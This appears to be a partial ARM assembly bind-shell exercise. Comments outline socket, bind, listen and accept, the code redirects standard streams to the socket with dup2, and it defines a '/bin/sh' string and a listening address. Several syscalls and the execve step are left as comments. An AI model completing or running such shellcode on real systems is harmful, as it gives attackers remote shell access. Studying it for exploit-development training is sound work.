@.syntax unified
.global _start
_start:
 
  @@@@@@ sockfd = socket(int socket_family, int socket_type, int protocol) @@@@@@
  @ socket_family = PF_INET = 2
  @ socket_type = SOCK_STREAM = 1
  @ protocol = IPPROTO_IP = 0
  @ socket syscall = 281
 
  @ r0 contains the fd returned by the syscall
  mov r6, r0         @ file descriptor
 
  @@@@@@ int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) @@@@@@
  mov r0, r6         @ sockfd = r6
  @ sockaddr struct = _sockaddr
  @ addrlen = 0x10
  @ bind syscall = 282
 
  @@@@@@ int listen(int sockfd, int backlog);
  mov r0, r6         @ sockfd = r6
  @ backlog = 1
  @ listen syscall = 284
 
  @@@@@@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) @@@@@@
  mov r0, r6         @ sockfd = r6
  @ addr = 0
  @ addrlen = 0
  @ accept syscall = 285
 
  @ Redirect stdin, stdout and stderr via dup2
  @ nothing to do here
  @ r0 = accepted socket 
  mov r1, #2         @ counter stdin(0), stdout(1) and stderr(2)
  loop:
    mov r7, #63      @ dup2 syscall
    swi 0
    sub r1, r1, #1   @ decrement counter
    cmp r1, #-1      @ compare r1 with -1
    bne loop         @ if the result is not equal jmp to loop
 
  @@@@@@ int execve(const char *filename, char *const argv[],char *const envp[]) @@@@@@
  @ we already know how to write it 
 
_exit:
  mov r0, #0
  mov r7, #1
  swi 0              @ exit(0)

_sh: 
  .asciz "/bin/sh"

_sockaddr:
  .hword 2                @ sin_family
  .hword 0xb315           @ sin_port
  .word  0                @ sin_addr
  .byte  0,0,0,0,0,0,0,0  @ sin_zero 
